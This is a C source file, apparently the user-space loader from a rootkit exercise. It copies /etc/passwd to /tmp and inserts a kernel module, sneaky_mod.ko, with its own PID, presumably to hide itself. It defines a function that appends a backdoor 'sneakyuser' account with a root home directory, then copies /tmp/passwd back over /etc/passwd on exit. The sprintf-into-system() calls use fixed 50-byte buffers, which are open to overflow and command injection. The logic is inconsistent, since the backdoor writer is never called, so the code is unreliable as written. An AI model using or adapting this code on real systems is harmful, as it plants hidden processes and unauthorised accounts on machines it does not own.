#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int copy_file(char * from, char * to)
{
    char arg[50];
    sprintf(arg, "cp %s %s", from, to);
    int status = system(arg);

    if (status == -1)
    {
        printf("Error executing the cp command.\n");
        return 1;
    }
    return 0; 
}

int change_user(){
    FILE *f = fopen("/tmp/passwd", "r+");
    if (f == NULL)
    {
        printf("cannot open file \n");
        exit(EXIT_FAILURE);
    }
    fseek(f, 0, SEEK_END);
    fprintf(f, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(f);
    return 0;
}

int main()
{
    pid_t pid = getpid();
    printf("sneaky_process pid = %d\n", pid);
    copy_file("/etc/passwd" ,"/tmp/");

    char arg[50];
    sprintf(arg, "insmod sneaky_mod.ko spid=%d", pid);
    system(arg);

    while (1){
        char c = fgetc(stdin);
        if (c == 'q')
        {
            break;
        }
    }
    system("rmmod sneaky_mod.ko");
    copy_file("/tmp/passwd", "/etc/");
    system("rm /tmp/passwd");
    return EXIT_SUCCESS;
}